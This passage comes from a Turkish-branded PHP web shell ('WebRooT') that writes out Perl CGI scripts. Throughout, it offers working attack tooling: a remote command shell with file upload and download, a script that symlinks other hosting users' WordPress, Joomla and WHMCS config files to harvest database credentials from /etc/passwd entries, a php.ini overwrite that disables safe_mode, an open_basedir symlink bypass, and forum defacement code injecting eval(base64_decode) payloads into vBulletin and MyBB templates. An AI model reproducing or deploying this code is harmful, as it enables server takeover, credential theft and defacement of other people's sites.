		$Prompt = $WinNT ? "$OldDir> " : "[admin\@$ServerName $OldDir]\$ ";
		print "$Prompt $RunCommand";
	}
	else # some other command, display the output
	{
		&PrintPageHeader("c");
		$Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
		print "$Prompt $RunCommand<xmp>";
		$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
		if(!$WinNT)
		{
			$SIG{'ALRM'} = \&CommandTimeout;
			alarm($CommandTimeoutDuration);
		}
		if($ShowDynamicOutput) # show output as it is generated
		{
			$|=1;
			$Command .= " |";
			open(CommandOutput, $Command);
			while(<CommandOutput>)
			{
				$_ =~ s/(\n|\r\n)$//;
				print "$_\n";
			}
			$|=0;
		}
		else # show output after command completes
		{
			print `$Command`;
		}
		if(!$WinNT)
		{
			alarm(0);
		}
		print "</xmp>";
	}
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function displays the page that contains a link which allows the user
# to download the specified file. The page also contains a auto-refresh
# feature that starts the download automatically.
# Argument 1: Fully qualified filename of the file to be downloaded
#------------------------------------------------------------------------------
sub PrintDownloadLinkPage
{
	local($FileUrl) = @_;
	if(-e $FileUrl) # if the file exists
	{
		# encode the file link so we can send it to the browser
		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
		&PrintPageHeader("c");
		print <<END;
<code>

Sending File $TransferFile...<br>
If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>.
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # file doesn't exist
	{
		&PrintPageHeader("f");
		print "Failed to download $FileUrl: $!";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# This function reads the specified file from the disk and sends it to the
# browser, so that it can be downloaded by the user.
# Argument 1: Fully qualified pathname of the file to be sent.
#------------------------------------------------------------------------------
sub SendFileToBrowser
{
	local($SendFile) = @_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{
		if($WinNT)
		{
			binmode(SENDFILE);
			binmode(STDOUT);
		}
		$FileSize = (stat($SendFile))[7];
		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
	}
	else # failed to open file
	{
		&PrintPageHeader("f");
		print "Failed to download $SendFile: $!";
		&PrintFileDownloadForm;

		&PrintPageFooter;
	}
}


#------------------------------------------------------------------------------
# This function is called when the user downloads a file. It displays a message
# to the user and provides a link through which the file can be downloaded.
# This function is also called when the user clicks on that link. In this case,
# the file is read and sent to the browser.
#------------------------------------------------------------------------------
sub BeginDownload
{
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# This function is called when the user wants to upload a file. If the
# file is not specified, it displays a form allowing the user to specify a
# file, otherwise it starts the upload process.
#------------------------------------------------------------------------------
sub UploadFile
{
	# if no file is specified, print the upload form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileUploadForm;
		&PrintPageFooter;
		return;
	}
	&PrintPageHeader("c");

	# start the uploading process
	print "Uploading $TransferFile to $CurrentDir...<br>";

	# get the fullly qualified pathname of the file to be created
	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;

	$TargetFileSize = length($in{'filedata'});
	# if the file exists and we are not supposed to overwrite it
	if(-e $TargetName && $Options ne "overwrite")
	{
		print "Failed: Destination file already exists.<br>";
	}
	else # file is not present
	{
		if(open(UPLOADFILE, ">$TargetName"))
		{
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			print "Transfered $TargetFileSize Bytes.<br>";
			print "File Path: $TargetName<br>";
		}
		else
		{
			print "Failed: $!<br>";
		}
	}
	print "";
	&PrintCommandLineInputForm;

	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called when the user wants to download a file. If the
# filename is not specified, it displays a form allowing the user to specify a
# file, otherwise it displays a message to the user and provides a link
# through  which the file can be downloaded.
#------------------------------------------------------------------------------
sub DownloadFile
{
	# if no file is specified, print the download form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileDownloadForm;
		&PrintPageFooter;
		return;
	}
	
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = $in{'c'};
$TransferFile = $in{'f'};
$Options = $in{'o'};

$Action = $in{'a'};
$Action = "login" if($Action eq ""); # no action specified, use default

# get the directory in which the commands will be executed
$CurrentDir = $in{'d'};
chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) # user needs/has to login
{
	&PerformLogin;

}
elsif($Action eq "command") # user wants to run a command
{
	&ExecuteCommand;
}
elsif($Action eq "upload") # user wants to upload a file
{
	&UploadFile;
}
elsif($Action eq "download") # user wants to download a file
{
	&DownloadFile;
}
elsif($Action eq "logout") # user wants to logout
{
	&PerformLogout;
}';
$IIIIIIIllIlI = fopen('web.root','w+');
$IIIIIIIllIll = fwrite ($IIIIIIIllIlI ,base64_decode($IIIIIIIllII1));
fclose($IIIIIIIllIlI);
chmod('web.root',0755);
echo '<iframe src=cgiweb/web.root width=100% height=600px frameborder=0></iframe> ';
break;
case 'config':
mkdir('configweb',0755);
chdir('configweb');
$IIIIIIIlI11I = '.htaccess';
$IIIIIIIlI11l = "$IIIIIIIlI11I";
$IIIIIIIlI111 = fopen ($IIIIIIIlI11l ,'w') or die ('Dosya a&#231;&#305;lamad&#305;!');
$IIIIIIIllIII = 'Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .root

AddHandler cgi-script .root
AddHandler cgi-script .root';
fwrite ( $IIIIIIIlI111 ,$IIIIIIIllIII ) ;
fclose ($IIIIIIIlI111);
$IIIIIIIllI1l = '#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Config Fucker</title>
<style type="text/css">
.dz {
    font-family: Tahoma;
    font-size: 14px;
    font-weight: bold;
    color: #3333ff;
    text-align: center;
    text-shadow: black 0px 0px 2px;
}
#checkouttextarea {

  webkit-border-radius: 15px;

}
:hover#checkouttextarea {opacity: 0.6; background-color:333333}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$kola=$msr."/".$user;
$kola=~s/\n//g; 
symlink('/home/'.$user.'/public_html/includes/configure.php',$kola.'-shop.txt');
symlink('/home/'.$user.'/public_html/os/includes/configure.php',$kola.'-shop-os.txt');
symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$kola.'-oscom.txt');
symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.'-oscommerce.txt');
symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.'-oscommerces.txt');
symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$kola.'-shop2.txt');
symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$kola.'-shop-shopping.txt');
symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$kola.'-sale.txt');
symlink('/home/'.$user.'/public_html/amember/config.inc.php',$kola.'-amember.txt');
symlink('/home/'.$user.'/public_html/config.inc.php',$kola.'-amember2.txt');
symlink('/home/'.$user.'/public_html/members/configuration.php',$kola.'-members.txt');
symlink('/home/'.$user.'/public_html/config.php',$kola.'-2.txt');
symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'-forum.txt');
symlink('/home/'.$user.'/public_html/forums/includes/config.php',$kola.'-forums.txt');
symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'-5.txt');
symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'-4.txt');
symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'-wp13.txt');
symlink('/home/'.$user.'/public_html/wp/wp-config.php',$kola.'-wp13-wp.txt');
symlink('/home/'.$user.'/public_html/WP/wp-config.php',$kola.'-wp13-WP.txt');
symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$kola.'-wp13-wp-beta.txt');
symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'-wp13-beta.txt');
symlink('/home/'.$user.'/public_html/press/wp-config.php',$kola.'-wp13-press.txt');
symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$kola.'-wp13-wordpress.txt');
symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$kola.'-wp13-Wordpress.txt');
symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.'-wp13-wordpress-beta.txt');
symlink('/home/'.$user.'/public_html/news/wp-config.php',$kola.'-wp13-news.txt');
symlink('/home/'.$user.'/public_html/new/wp-config.php',$kola.'-wp13-new.txt');
symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'-wp-blog.txt');
symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'-wp-beta.txt');
symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$kola.'-wp-blogs.txt');
symlink('/home/'.$user.'/public_html/home/wp-config.php',$kola.'-wp-home.txt');
symlink('/home/'.$user.'/public_html/protal/wp-config.php',$kola.'-wp-protal.txt');
symlink('/home/'.$user.'/public_html/site/wp-config.php',$kola.'-wp-site.txt');
symlink('/home/'.$user.'/public_html/main/wp-config.php',$kola.'-wp-main.txt');
symlink('/home/'.$user.'/public_html/test/wp-config.php',$kola.'-wp-test.txt');
symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'-6.txt');
symlink('/home/'.$user.'/public_html/include/db.php',$kola.'-7.txt');
symlink('/home/'.$user.'/public_html/connect.php',$kola.'-8.txt');
symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'-9.txt');
symlink('/home/'.$user.'/public_html/include/config.php',$kola.'-12.txt');
symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'-joomla2.txt');
symlink('/home/'.$user.'/public_html/protal/configuration.php',$kola.'-joomla-protal.txt');
symlink('/home/'.$user.'/public_html/joo/configuration.php',$kola.'-joo.txt');
symlink('/home/'.$user.'/public_html/cms/configuration.php',$kola.'-joomla-cms.txt');
symlink('/home/'.$user.'/public_html/site/configuration.php',$kola.'-joomla-site.txt');
symlink('/home/'.$user.'/public_html/main/configuration.php',$kola.'-joomla-main.txt');
symlink('/home/'.$user.'/public_html/news/configuration.php',$kola.'-joomla-news.txt');
symlink('/home/'.$user.'/public_html/new/configuration.php',$kola.'-joomla-new.txt');
symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.'-joomla-home.txt');
symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'-vb.txt');
symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$kola.'-vb3.txt');
symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'-includes-vb.txt');
symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'-whm15.txt');
symlink('/home/'.$user.'/public_html/central/configuration.php',$kola.'-whm-central.txt');
symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$kola.'-whm-whmcs.txt');
symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$kola.'-whm-WHMCS.txt');
symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$kola.'-whmc-WHM.txt');
symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.'-whmcs.txt');
symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'-support.txt');
symlink('/home/'.$user.'/public_html/supp/configuration.php',$kola.'-supp.txt');
symlink('/home/'.$user.'/public_html/secure/configuration.php',$kola.'-sucure.txt');
symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$kola.'-sucure-whm.txt');
symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$kola.'-sucure-whmcs.txt');
symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$kola.'-cpanel.txt');
symlink('/home/'.$user.'/public_html/panel/configuration.php',$kola.'-panel.txt');
symlink('/home/'.$user.'/public_html/host/configuration.php',$kola.'-host.txt');
symlink('/home/'.$user.'/public_html/hosting/configuration.php',$kola.'-hosting.txt');
symlink('/home/'.$user.'/public_html/hosts/configuration.php',$kola.'-hosts.txt');
symlink('/home/'.$user.'/public_html/configuration.php',$kola.'-joomla.txt');
symlink('/home/'.$user.'/public_html/submitticket.php',$kola.'-whmcs2.txt');
symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.'-clients.txt');
symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.'-client.txt');
symlink('/home/'.$user.'/public_html/clientes/configuration.php',$kola.'-clientes.txt');
symlink('/home/'.$user.'/public_html/cliente/configuration.php',$kola.'-client.txt');
symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$kola.'-clientsupport.txt');
symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.'-billing.txt'); 
symlink('/home/'.$user.'/public_html/manage/configuration.php',$kola.'-whm-manage.txt'); 
symlink('/home/'.$user.'/public_html/my/configuration.php',$kola.'-whm-my.txt'); 
symlink('/home/'.$user.'/public_html/myshop/configuration.php',$kola.'-whm-myshop.txt'); 
symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$kola.'-zencart.txt'); 
symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.'-shop-zencart.txt'); 
symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.'-shop-ZCshop.txt'); 
symlink('/home/'.$user.'/public_html/Settings.php',$kola.'-smf.txt'); 
symlink('/home/'.$user.'/public_html/smf/Settings.php',$kola.'-smf2.txt'); 
symlink('/home/'.$user.'/public_html/forum/Settings.php',$kola.'-smf-forum.txt'); 
symlink('/home/'.$user.'/public_html/forums/Settings.php',$kola.'-smf-forums.txt'); 
symlink('/home/'.$user.'/public_html/upload/includes/config.php',$kola.'-up.txt'); 
symlink('/home/'.$user.'/public_html/up/includes/config.php',$kola.'-up2.txt'); 
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="dz" bgcolor="#F4F4F4">
<p>WebRooT Config Fucker</p>
<p>WebRooT.info</p>
<span><font color="red">Kullanimi:</font> Passwd icerigini asagidaki bosluga yapistiriniz.. => <font color="black">cat /etc/passwd</font></span><br />
<br /><form method="post"><strong>
<textarea id="checkouttextarea" name="pass" style="border:1px dotted #00FFFF; width:  498px; height: 370px; background-color:#F4F4F4; font-family:Tahoma; font-size:9pt; color: black"  ></textarea><br />
&nbsp;<p>
<input name="tar" type="text" style="border:1px dotted #00FFFF; width: 212px; background-color:#F4F4F4; font-family:Tahoma; font-size:8pt; color:black; "  /><br />
&nbsp;</p>
<p>
<input name="Submit1" type="submit" value="Config Cek" style="border:1px dotted #00FFFF; width: 99; font-family:Tahoma; font-size:10pt; color: black; text-transform:uppercase; height:23; background-color:#F4F4F4;" /></p>
</form></strong>
';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="dz" bgcolor="#F4F4F4">
<h2>TamamLandi..!</h2>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar"><font color="#00FF00">
<span style="text-decoration: none">Click Here To Download Tar File</span></font></a></p>';
}
}
 print"
</body>
</html+Ijs=';
$IIIIIIIllIlI = fopen('config.root','w+');
$IIIIIIIllIll = fwrite ($IIIIIIIllIlI ,base64_decode($IIIIIIIllI1l));
fclose($IIIIIIIllIlI);
chmod('config.root',0755);
echo '<iframe src=configweb/config.root width=100% height=620px frameborder=0></iframe> ';
break;
case 'php_ini':   
$IIIIIIIlI11I = 'php.ini';
$IIIIIIIlI11l = "$IIIIIIIlI11I";
$IIIIIIIlI111 = fopen ($IIIIIIIlI11l ,'w') or die ('Dosya a&#231;&#305;lamad&#305;!');
$IIIIIIIllIII = 'safe_mode = off
exec = On
shell_exec = On';
fwrite ( $IIIIIIIlI111 ,$IIIIIIIllIII ) ;
fclose ($IIIIIIIlI111);
echo '<center><img src=http://img810.imageshack.us/img810/8043/webr00t12.png></center>';
echo '<center><b><font color=red>Safe Mod ve Kapalý Fonksiyonlar Deaktif Edildi.. <a href="?">AnaDizin..</a></b></font></center>';
break;
case 'open':
$IIIIIIIllI11='bypass';
if($_REQUEST['basedir']!=$IIIIIIIllI11)
{
echo '<iframe src=cp width=100% height=100% frameborder=0></iframe> ';
exit;
}
eval(base64_decode('$fakedir="cx";
$fakedep=16;

$num=0; // offset of symlink.$num

if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];
else $file="";

echo '<PRE><img
src="http://img810.imageshack.us/img810/8043/webr00t12.png"><P>W£ßRooT Symlink Shell <a
href="http://webr00t.info/"></a>
<p>PHP 5.2.11 5.3.0 symlink open_basedir bypass
<p>Daha Fazlas1: <a href="http://webr00t.info/">W£ßRooT</a>
<p><form name="form"
 action="?webr00t=symlink&bypass=cp" method="post"><input type="text" name="file" size="50"
value="'.htmlspecialchars($file).'"><input type="submit" name="hym"
value="Create Symlink"></form>';

if(empty($file))
    exit;

if(!is_writable("."))
    die("not writable directory");

$level=0;

for($as=0;$as<$fakedep;$as++){
    if(!file_exists($fakedir))
        mkdir($fakedir);
    chdir($fakedir);
}

while(1<$as--) chdir("..");

$hardstyle = explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
    if(!empty($hardstyle[$a])){
        if(!file_exists($hardstyle[$a])) 
            mkdir($hardstyle[$a]);
        chdir($hardstyle[$a]);
        $as++;
    }
}
$as++;
while($as--)
    chdir("..");

@rmdir("fakesymlink");
@unlink("fakesymlink");

@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");

// this loop will skip allready created symlinks.
while(1)
    if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file,
"symlink".$num))) break;
    else $num++;

@unlink("fakesymlink");
mkdir("fakesymlink");

die('<FONT COLOR="RED">check symlink <a
href="./symlink'.$num.'">symlink'.$num.'</a> file</FONT>');
break;
case 'indexer':
mkdir('indexer',0755);
chdir('indexer');
$IIIIIIIlllII = '<p align="right"></p><body bgcolor="#FFFFFF"> 
<?php 

######################## Begining of Coding ;) ###################### 
error_reporting(0); 

    $info = $_SERVER['SERVER_SOFTWARE']; 
    $site = getenv("HTTP_HOST"); 
    $page = $_SERVER['SCRIPT_NAME']; 
    $sname = $_SERVER['SERVER_NAME']; 
    $uname = php_uname(); 
    $smod = ini_get('safe_mode'); 
    $disfunc = ini_get('disable_functions'); 
    $yourip = $_SERVER['REMOTE_ADDR']; 
    $serverip = $_SERVER['SERVER_ADDR']; 
    $version = phpversion(); 
    $ccc = realpath($_GET['chdir'])."/"; 
    $fdel = $_GET['fdel']; 
    $execute = $_POST['execute']; 
    $cmd = $_POST['cmd']; 
    $commander = $_POST['commander']; 
    $ls = "ls -la"; 
    $source = $_POST['source']; 
    $gomkf = $_POST['gomkf']; 
    $title = $_POST['title']; 
    $sourcego = $_POST['sourcego']; 
    $ftemp = "tmp"; 
    $temp = tempnam($ftemp, "cx"); 
    $fcopy = $_POST['fcopy']; 
    $tuser = $_POST['tuser']; 
    $user = $_POST['user']; 
    $wdir = $_POST['wdir']; 
    $tdir = $_POST['tdir']; 
    $symgo = $_POST['symgo']; 
    $sym = "xhackers.txt"; 
    $to = $_POST['to']; 
    $sbjct = $_POST['sbjct']; 
    $msg = $_POST['msg']; 
    $header = "From:".$_POST['header']; 


//PHPinfo 

if(isset($_POST['phpinfo'])) 
{ 
    die(phpinfo()); 
} 
//Guvenli mod vs vs 
if ($smod) 
{ 
    $c_h = "<font color=red face='Verdana' size='1'>ON</font>"; 
} 
else 
{ 
    $c_h = "<font face='Verdana' size='1' color=green>OFF</font>"; 
} 

//Kapali Fonksiyonlar 
if (''==($disfunc)) 
{ 
    $dis = "<font color=green>None</font>"; 
} 
else 
{ 
    $dis = "<font color=red>$disfunc</font>"; 
} 
//Dizin degisimi 
if(isset($_GET['dir']) && is_dir($_GET['dir'])) 
{ 
 chdir($_GET['dir']); 
} 

$ccc = realpath($_GET['chdir'])."/"; 

//Baslik 
echo "<head> 
<style> 
body { font-size: 12px; 

           font-family: arial, helvetica; 

            scrollbar-width: 5; 

            scrollbar-height: 5; 

            scrollbar-face-color: black; 

            scrollbar-shadow-color: silver; 

            scrollbar-highlight-color: silver; 

            scrollbar-3dlight-color:silver; 

            scrollbar-darkshadow-color: silver; 

            scrollbar-track-color: black; 

            scrollbar-arrow-color: silver; 

    } 
</style> 

<title>Lolipop</title></head>"; 
//Ana tablo 
echo "<body text='#FFFFFF'> 
<table border='1' width='100%' id='table1' border='1' cellPadding=5 cellSpacing=0 borderColorDark=#666666 bordercolorlight='#C0C0C0'> 
</table>"; 
echo '<td><font color="#CC0000"><strong></strong></font><font color="#000000"></em></font>    </tr> 
'; 
//Buton Listesi 
echo "<center><form method=POST action''><input type=submit name=vbulletin value='VB HACK.'><input type=submit name=mybulletin value='MyBB HACK.'><input type=submit name=phpbb value='  phpBB HACK.  '><input type=submit name=smf value='  SMF HACK.  '></form></center>"; 




//VB HACK 
if (isset($_POST['vbulletin'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>== VB indexer ==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=dbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=dbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=dbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
		  
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=dbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>indexin Yazilacagi Bolum</font><br><textarea name=index rows='19' cols='103' style='color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.indexi yaz postala kay gitsin.</textarea><br> 
          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$webr00t="Powered By WebRooT"; 
$dbh = $_POST['dbh']; 
$dbu = $_POST['dbu']; 
$dbn = $_POST['dbn']; 
$dbp = $_POST['dbp']; 
$index = $_POST['index']; 
$index=str_replace("\'","'",$index); 
$set_index  = "{\${eval(base64_decode(\'"; 

$set_index .= base64_encode("echo \"$index\";"); 


$set_index .= "\'))}}{\${exit()}}</textarea>"; 


if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) 
{ 
mysql_connect($dbh,$dbu,$dbp) or die(mysql_error()); 
mysql_select_db($dbn) or die(mysql_error()); 
$loli1 = "UPDATE template SET template='".$set_index."".$webr00t."' WHERE title='spacer_open'"; 
$loli2 = "UPDATE template SET template='".$set_index."".$webr00t."' WHERE title='FORUMHOME'"; 
$loli3 = "UPDATE style SET css='".$set_index."".$webr00t."', stylevars='', csscolors='', editorstyles=''"; 
$result = mysql_query($loli1) or die (mysql_error()); 
$result = mysql_query($loli2) or die (mysql_error()); 
$result = mysql_query($loli3) or die (mysql_error()); 
echo "<script>alert('Vb Hacked');</script>"; 
} 

//MyBB Hack 
if (isset($_POST['mybulletin'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>== MyBB indexer ==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=mybbdbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=mybbdbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=mybbdbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=mybbdbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>indexin Yazilacagi Bolum</font><br><textarea name=mybbindex rows='19' cols='103' style='color: #000000; background-color: #FFFFFF'>buraya indexiniz gelecek.?ndexi yaz postala kay gitsin.</textarea><br> 
          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
$mybb_dbh = $_POST['mybbdbh']; 
$mybb_dbu = $_POST['mybbdbu']; 
$mybb_dbn = $_POST['mybbdbn']; 
$mybb_dbp = $_POST['mybbdbp']; 
$mybb_index = $_POST['mybbindex']; 

if (!empty($mybb_dbh) && !empty($mybb_dbu) && !empty($mybb_dbn) && !empty($mybb_index)) 
{ 
mysql_connect($mybb_dbh,$mybb_dbu,$mybb_dbp) or die(mysql_error()); 
mysql_select_db($mybb_dbn) or die(mysql_error()); 
$prefix="mybb_"; 
$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'"; 

$result = mysql_query($loli7) or die (mysql_error()); 

echo "<script>alert('MyBB Hacked');</script>"; 
} 
//PhpBB 
if (isset($_POST['phpbb'])) 
{ 
echo "<center><table border=0 width='100%'> 
<tr><td> 
<center><font face='Arial' color='#000000'>== PHPBB indexer ==</font></center> 
    <center><form method=POST action=''><font face='Arial' color='#000000'>Mysql Host</font><br><input type=text name=phpbbdbh value=localhost size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>DbKullanici<br></font><input type=text name=phpbbdbu size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbadi<br></font><input type=text name=phpbbdbn size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Dbsifre<br></font><input type=password name=phpbbdbp size='50' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Yazi Veya  KOD<br></font><input type=text name=phpbbkat size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <font face='Arial' color='#000000'>Degisecek KATEGORI ID si<br></font><input type=text name=katid size='100' style='font-size: 8pt; color: #000000; font-family: Tahoma; border: 1px solid #666666; background-color: #FFFFFF'><br> 
          <input type=submit value='Kay Gitsin!' ></form></center></td></tr></table></center>"; 
die(); 
} 
